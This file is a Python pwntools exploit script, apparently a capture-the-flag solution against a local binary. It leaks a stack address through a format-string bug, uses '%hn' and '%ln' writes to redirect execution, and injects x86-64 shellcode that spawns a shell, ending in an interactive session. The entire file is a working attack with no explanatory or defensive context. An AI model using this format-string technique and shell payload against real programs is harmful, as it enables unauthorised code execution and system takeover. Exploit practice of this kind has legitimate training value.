#!/usr/bin/env python

from pwn import *

#context.log_level = "debug"

elf = "./a.out"

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e" \
            "\xb0\x3b\x0f\x05"

p = process(elf)

def inputs(secret):
    p.recvuntil("please input your secret:")
    p.sendline(secret)

def conti():
    p.recvuntil("continue?")
    p.sendline("1")


payload = "%6$lx"
inputs(payload)

stack_addr = int(p.recvline()[:-1], 0x10)-0xf0
log.info("stack_addr: "+hex(stack_addr))

conti()

payload = "%"+str((stack_addr+0x18)%0x10000)+"x%11$hn"
inputs(payload)

conti()

ret_addr = 0x6010a0-len(shellcode)

payload = shellcode
payload += "%"+str(ret_addr)+"x"
payload += "%37$ln"
inputs(payload)

p.sendline("0")

p.interactive()
